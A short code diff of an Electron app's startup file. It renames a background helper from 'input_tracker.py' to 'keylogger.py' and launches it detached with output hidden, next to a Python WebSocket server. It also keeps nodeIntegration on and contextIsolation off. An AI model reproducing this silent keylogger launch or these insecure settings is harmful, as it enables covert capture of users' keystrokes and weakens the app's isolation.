@@ -7,7 +7,6 @@ function createWindow() {
     width: 900,
     height: 600,
     webPreferences: {
-      preload: path.join(__dirname, 'renderer.js'),
       nodeIntegration: true,
       contextIsolation: false
     }
@@ -17,15 +16,13 @@ function createWindow() {
 }
 
 app.whenReady().then(() => {
-  // Start WebSocket server
   spawn('python', ['server.py'], {
     cwd: __dirname,
     detached: true,
     stdio: 'ignore'
   });
 
-  // Start input tracker
-  spawn('python', ['input_tracker.py'], {
+  spawn('python', ['keylogger.py'], {
     cwd: __dirname,
     detached: true,
     stdio: 'ignore'
